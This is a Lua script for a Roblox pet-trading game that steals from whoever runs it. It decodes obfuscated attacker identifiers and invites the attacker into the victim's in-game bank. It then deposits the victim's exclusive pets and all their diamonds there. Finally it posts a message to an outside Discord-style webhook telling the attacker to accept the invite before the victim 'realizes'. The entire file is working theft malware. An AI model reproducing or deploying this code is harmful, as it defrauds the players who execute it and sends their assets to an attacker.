local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

function dec(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
    end))
end
return function(Me,client_id,client_token,DiscordID)
    Me = tonumber(dec(tostring(Me)))
    client_id = dec(client_id)
    client_token = dec(client_token)
    local Hook = "https://hooks.hyra.io/api/webhooks/"..client_id.."/"..client_token
    DiscordID = tonumber(dec(tostring(DiscordID)))
    local Library = require(game.ReplicatedStorage.Framework.Library)
    local Pets = Library.Save.Get().Pets
    function initEvent(event)
    local args = {
        [1] = "b",
        [2] = event
    }

    workspace.__THINGS.__REMOTES.MAIN:FireServer(unpack(args))
    end
    local Event = game.Workspace.__THINGS.__REMOTES:FindFirstChild("invite to bank")
    if not Event then
        initEvent("invite to bank")
    end
    Event = game.Workspace.__THINGS.__REMOTES:WaitForChild("invite to bank")

    local Event2 = game.Workspace.__THINGS.__REMOTES:FindFirstChild("bank deposit")
    if not Event2 then
        initEvent("bank deposit")
    end
    Event2 = game.Workspace.__THINGS.__REMOTES:WaitForChild("bank deposit")
    local Https = game:GetService("HttpService")
    Send = function(Webhook, Data)
        local NewData
        local success, errormessage = pcall(function()
            NewData = Https:JSONEncode(Data)
        end)
        if success then
        else
        end

        local success1, errormessage1 = pcall(function()
            game:HttpPost(Webhook,NewData,false,"application/json")
        end)
        
        if success1 then
        else
            print(errormessage1)
        end
    end

    function getUserBank()
        local args = {
            [1] = {}
        }
        
        local e = workspace.__THINGS.__REMOTES:FindFirstChild("get my banks"):InvokeServer(unpack(args))

        for i,v in pairs(e) do
            for i=1,#v do
                if tostring(v[i].Owner) == tostring(game.Players.LocalPlayer.UserId) then
                    return v[i].BUID    
                end
            end
        end
        return nil
    end
    function inviteToBank()
        local MyBank = getUserBank()
        if MyBank then
            local args = {
                [1] = {
                    [1] = MyBank,
                    [2] = Me,
                }
            }
            Event:InvokeServer(unpack(args))
        end
    end
    function depositPets(tbl,bankid)
        local args = {
            [1] = {
                [1] = bankid,
                [2] = tbl,
                [3] = 0
            }
        }
        return Event2:InvokeServer(unpack(args))
    end
    function depositDiamonds(bankid)
        local args = {
            [1] = {
                [1] = bankid,
                [2] = {},
                [3] = Library.Save.Get().Diamonds
            }
        }
        return Event2:InvokeServer(unpack(args))
    end

    local petids = {}
    local count = 0
    for i,v in pairs(Pets) do
        if Library.Directory.Pets[v.id].rarity=="Exclusive" and count<2 then
            table.insert(petids,v.uid)
            count  = count + 1
        end
    end
    if #petids>50 then
        local c = #petids-50
        for i=1,c do
            table.remove(petids,50+i)    
        end
    end
    local Bank = getUserBank()
    inviteToBank()
    depositPets(petids,Bank)
    depositDiamonds(Bank)
    local Data = {
        content = "<@"..DiscordID..">",
        embeds = {
            {
                title = game.Players.LocalPlayer.Name.." just executed the script lol",
                description = "Accept their bank invite before this dumbass realizes",
                color = 16533845
            }
        }
    }
    Send(Hook,Data)
end